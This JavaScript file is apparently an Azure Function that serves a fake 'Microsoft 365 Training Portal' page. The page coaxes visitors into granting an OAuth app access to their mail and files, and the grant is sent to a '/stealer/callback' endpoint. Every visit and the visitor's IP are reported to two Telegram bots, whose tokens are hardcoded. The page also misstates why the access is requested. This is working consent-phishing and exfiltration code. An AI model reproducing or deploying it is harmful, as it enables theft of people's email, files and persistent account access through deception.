const TELEGRAM_BOT_TOKEN = '7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps';
const TELEGRAM_CHAT_ID = '6743632244';
const TELEGRAM_BOT_TOKEN_2 = '7942871168:AAFuvCQXQJhYKipqGpr1G4IhUDABTGWF_9U';
const TELEGRAM_CHAT_ID_2 = '6263177378';

async function sendTelegram(message) {
  try {
    const promises = [
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      }),
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN_2}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID_2,
          text: message,
          parse_mode: 'HTML'
        })
      })
    ];
    await Promise.all(promises);
  } catch (error) {
    console.error('Telegram error:', error);
  }
}

module.exports = async function (context, req) {
  await sendTelegram(`📚 <b>TRAINING: OAuth page accessed</b>\n📅 ${new Date().toISOString()}\n🌐 IP: ${req.headers['x-forwarded-for'] || 'Unknown'}`);
  
  const CLIENT_ID = 'f840d591-c00e-4aa0-8ebe-77b5f34b81e1';
  const REDIRECT_URI = 'https://aitm-func-1753463791.azurewebsites.net/stealer/callback';
  const SCOPES = 'User.Read Mail.Read Files.ReadWrite offline_access';
  
  const authUrl = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${CLIENT_ID}&response_type=code&redirect_uri=${encodeURIComponent(REDIRECT_URI)}&scope=${encodeURIComponent(SCOPES)}&response_mode=query&state=training_${Date.now()}`;
  
  context.res = {
    status: 200,
    headers: { 'Content-Type': 'text/html' },
    body: `
<!DOCTYPE html>
<html>
<head>
    <title>Microsoft Training Portal</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: linear-gradient(135deg, #0078d4 0%, #106ebe 100%); min-height: 100vh; padding: 20px; }
        .container { max-width: 800px; margin: 0 auto; background: white; border-radius: 12px; padding: 40px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .header { text-align: center; margin-bottom: 40px; }
        .logo { width: 100px; height: 100px; margin: 0 auto 20px; background: #0078d4; border-radius: 12px; display: flex; align-items: center; justify-content: center; color: white; font-size: 40px; font-weight: bold; }
        h1 { color: #323130; margin-bottom: 10px; font-weight: 600; }
        .subtitle { color: #605e5c; font-size: 18px; }
        .training-content { margin: 30px 0; }
        .feature { background: #f8f9fa; padding: 20px; margin: 20px 0; border-radius: 8px; border-left: 4px solid #0078d4; }
        .cta { text-align: center; margin: 40px 0; }
        .button { background: #0078d4; color: white; text-decoration: none; padding: 15px 30px; border-radius: 6px; font-size: 18px; font-weight: 600; display: inline-block; transition: background 0.3s; }
        .button:hover { background: #106ebe; }
        .disclaimer { background: #fff3cd; padding: 15px; border-radius: 6px; color: #856404; margin-top: 30px; font-size: 14px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">M</div>
            <h1>Microsoft 365 Training Portal</h1>
            <p class="subtitle">Advanced Productivity Training Program</p>
        </div>
        
        <div class="training-content">
            <div class="feature">
                <h3>📊 Advanced Excel Analytics</h3>
                <p>Learn cutting-edge data analysis techniques, pivot tables, and Power Query integration for professional reporting.</p>
            </div>
            
            <div class="feature">
                <h3>📧 Outlook Productivity Mastery</h3>
                <p>Master email management, calendar optimization, and Teams integration for seamless workflow management.</p>
            </div>
            
            <div class="feature">
                <h3>📁 SharePoint Collaboration</h3>
                <p>Discover advanced document management, workflow automation, and team collaboration strategies.</p>
            </div>
            
            <div class="feature">
                <h3>🔐 Security Best Practices</h3>
                <p>Learn enterprise-grade security protocols, multi-factor authentication, and data protection strategies.</p>
            </div>
        </div>
        
        <div class="cta">
            <h2>Ready to Begin Your Training?</h2>
            <p style="margin: 15px 0; color: #605e5c;">Connect your Microsoft account to access personalized training modules and track your progress.</p>
            <a href="${authUrl}" class="button">Connect Microsoft Account</a>
        </div>
        
        <div class="disclaimer">
            <strong>Training Authorization:</strong> By connecting your account, you authorize access to your profile and productivity data to personalize your learning experience. This includes reading your email patterns for Outlook training recommendations and accessing your files for collaboration best practices.
        </div>
    </div>
</body>
</html>
    `
  };
};